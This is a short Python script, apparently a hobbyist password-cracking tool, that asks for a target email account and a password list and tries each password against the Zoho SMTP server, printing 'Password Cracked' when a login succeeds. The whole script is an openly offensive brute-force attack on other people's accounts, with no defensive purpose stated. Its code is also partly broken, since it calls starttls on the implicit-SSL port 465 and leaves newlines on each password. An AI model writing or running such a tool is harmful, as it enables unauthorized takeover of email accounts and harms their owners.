import smtplib



gmail = smtplib.SMTP("smtp.zoho.com", 465)
gmail.ehlo()
gmail.starttls()

user1 = input ("Enter Your Target Account : ")
passwfile1 = input ("Enter Your Password List : ")
passwfile1 = open(passwfile1, "r")

for password1 in passwfile1 :
    try :

        gmail.login(user1, password1)
        print ("Password Cracked ===>", password1)
        break;

    except smtplib.SMTPAuthenticationError :
        print ("Password Didn't Cracked ===> ", password1)


